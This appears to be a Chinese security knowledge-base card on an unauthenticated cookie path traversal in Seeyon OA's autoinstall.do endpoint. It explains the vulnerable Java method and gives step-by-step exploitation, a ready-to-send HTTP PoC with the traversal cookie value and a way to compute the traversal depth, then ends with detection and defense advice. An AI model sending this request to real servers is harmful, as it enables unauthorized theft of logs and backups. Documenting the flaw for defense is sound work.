---
id: web-java-component-seeyon-autoinstall-login-locale-zip-traversal
title: 致远 OA autoinstall.do 前台未授权，login_locale Cookie 目录穿越下载任意 ZIP
type: scenario
domain: web
path: web/java/component
technique: seeyon-autoinstall-cookie-path-traversal-zip-download
tags:
- java
- seeyon
- oa
- path-traversal
- arbitrary-file-read
- cookie
- unauthenticated
- zip-download
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V34
  verified_at: '2026-11-05T06:01:37+08:00'
  notes: 已对照原文与18张图核对：autoinstall.do bean 路由与 @NeedlessCheckLogin、MultiActionController method= 分发、regInstallDown64 从 login_locale Cookie 取值拼 fileName、/../../../Logs 三层穿越读 C:\Seeyon\A8\Logs.zip、响应 Content-Disposition 均与卡片一致；DoS 写 zip 延伸已按规则排除。未验证点：原文未给产品版本区间，未设置 affected_versions；未在本机复现。
url: /docs/web/java/component/web-java-component-seeyon-autoinstall-login-locale-zip-traversal/
draft: false
kb_aliases:
- 致远 OA autoinstall.do 任意文件下载
- Seeyon login_locale 目录穿越
- regInstallDown64 任意 ZIP 读取
- autoinstall.do 前台 0day
- NeedlessCheckLogin 文件下载
---

## 一句话结论

致远 OA 的 `POST /seeyon/autoinstall.do`（`method=regInstallDown64`）带有 `@NeedlessCheckLogin`，前台未授权可达；`AutoInstallController.regInstallDown64` 从 Cookie `login_locale` 取值后不做任何过滤就拼进下载文件名 `临时目录/regInstall64_<host>_<login_locale>.zip`，攻击者用 `/../../../Logs` 之类的值即可三层目录穿越，下载服务器上任意已知路径的 ZIP 文件（日志包、备份等）。

## 原理

- 路由来自 Spring bean 的 `name="autoinstall.do"`，`AutoInstallController` 继承 `BaseController → MultiActionController`；`MultiActionController` 用 `methodNameResolver` 按请求参数 `method=xxx` 分发到同名方法。类上的 `@NeedlessCheckLogin` 表示该入口不要求登录。
- 漏洞方法：
  ```java
  @SetContentType
  public ModelAndView regInstallDown64(HttpServletRequest request, HttpServletResponse response) {
      String localeName = "";
      Cookie[] cookies = request.getCookies();
      for (Cookie cookie : cookies) {
          if ("login_locale".equals(cookie.getName())) {
              localeName = cookie.getValue();
          }
      }
      ...
      String fileName = SystemEnvironment.getSystemTempFolder() + separator
          + "regInstall64_" + request.getServerName() + "_" + localeName + ".zip";
      ...
      br = new BufferedInputStream(new FileInputStream(fileName));
      response.setHeader("Content-disposition",
          "attachment;filename=\"SeeyonActivexInstall64_" + localeName + ".zip\"");
      // 将 fileName 内容写回响应
  }
  ```
  `login_locale` 完全来自客户端 Cookie，未过滤 `../`、未规范化，直接参与 `FileInputStream` 的路径。
- 生成的路径形如 `C:\Seeyon\A8\base\temporary\regInstall64_<host>_<login_locale>.zip`。攻击者传入 `login_locale=/../../../Logs`：
  - `regInstall64_<host>_` 被当作一个（不存在的）目录段；
  - 三个 `..` 依次回到 `temporary`、`base`、`A8`；
  - 最终读取 `C:\Seeyon\A8\Logs.zip`（原文环境中的日志打包文件）。
- 若目标文件不存在，代码会走“生成安装包”分支，在临时目录创建 zip 并写入 `url.txt`/`locale.txt`；因此只有在目标 ZIP 已存在时才能读，路径和文件名需要已知或可猜。
- 代码没有限制读取文件必须位于临时目录，`FileInputStream` 直接打开拼接后的绝对路径，因此是典型的 Cookie 值路径穿越。

## 触发条件

- 致远 OA 存在 `autoinstall.do` 的 `regInstallDown64` 方法（A8 系列，`@NeedlessCheckLogin` 未移除）。
- 目标系统上存在攻击者已知路径/文件名的 `.zip` 文件（如日志打包、备份包）。
- 请求无需登录，只需携带 `login_locale` Cookie；contextPath 通常为 `/seeyon`。
- 目标文件可被 Web 进程读取。

## 利用步骤

1. 访问 `/seeyon/autoinstall.do`，POST `method=regInstallDown64`，先用正常 `login_locale=zh_CN` 确认接口返回 zip 附件（正常功能）。
2. 根据目标安装结构推测 ZIP 文件位置（如 `C:\Seeyon\A8\Logs.zip`、备份目录下的 `.zip`）。
3. 构造 `login_locale=/../../../Logs`（层数按临时目录深度调整），使拼接后的路径穿越到目标 ZIP。
4. 发送请求，响应 `Content-Disposition: attachment` 即为下载成功；用 `Content-Length`/文件头 `PK` 判断是否为有效 zip。
5. 若路径不对，接口会尝试在临时目录生成新 zip（可能成功返回正常安装包），需通过文件内容/大小区分是否读到了目标文件。

## PoC

```http
POST /seeyon/autoinstall.do HTTP/1.1
Host: target
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
Cookie: login_locale=/../../../Logs;
Content-Length: 23
Connection: keep-alive

method=regInstallDown64
```

原文环境结果：成功在前台下载到 `Logs.zip`（临时目录为 `C:\Seeyon\A8\base\temporary`，故用三层 `..` 到 `C:\Seeyon\A8`）。

路径层数计算：拼接串为 `<temp>\regInstall64_<serverName>_<localeName>.zip`，`regInstall64_<serverName>_` 本身占一层，因此 `..` 数量 = 需要上跳的业务目录层数 + 1；先确认 `SystemTempFolder` 的实际深度再调整。

## 变体与关联

- 文件名变体：目标不限于 `Logs.zip`，任何已知路径的 `.zip`（备份、导出包、插件包）都可读；`login_locale` 里可用 `/../../..` 配合不同文件名，但最终必须拼出 `.zip` 后缀。
- 参数来源变体：除 Cookie 外，若 `Accept-Language` 分支被走到，locale 还会来自请求头；但 Cookie 优先级更高，攻击者可直接控制。
- 写文件副作用：文件不存在时会在临时目录生成 zip；原文将其延伸为“向任意目录写任意命名 zip”的 DoS 原语（本卡不展开，按规则排除 DoS）。
- 关联：[[web-generic-file-inclusion-extattrs-filename-traversal-download]]、[[web-generic-file-inclusion-windows-backslash-download-traversal]]（同为参数进入下载路径导致目录穿越文件读取）。
- 边界：若 `login_locale` 增加 `../` 过滤/规范化、接口加上登录校验，或目标 ZIP 不在可读路径，则失效。

## 检测与防御

- 检测：`/seeyon/autoinstall.do` 的 `login_locale` Cookie 含 `../`、`..\`、绝对路径分隔符；同一来源短时间内多次请求不同路径。
- 检测：接口响应为 `application/x-msdownload` 且文件名/内容与正常安装包不符；访问 `autoinstall.do` 的请求未携带有效会话。
- 防御：对 `login_locale` 做白名单（只允许语言代码如 `zh_CN`、`en`），禁止路径分隔符与 `..`；拼接后用 `getCanonicalPath()` 校验必须位于临时目录。
- 防御：下载接口增加登录/权限校验，移除不必要的 `@NeedlessCheckLogin`；按 ID 映射文件而不是让客户端拼路径。
- 加固：ZIP 文件不要放在可预测路径；日志/备份目录权限最小化；WAF 拦截 Cookie 中的目录穿越特征。
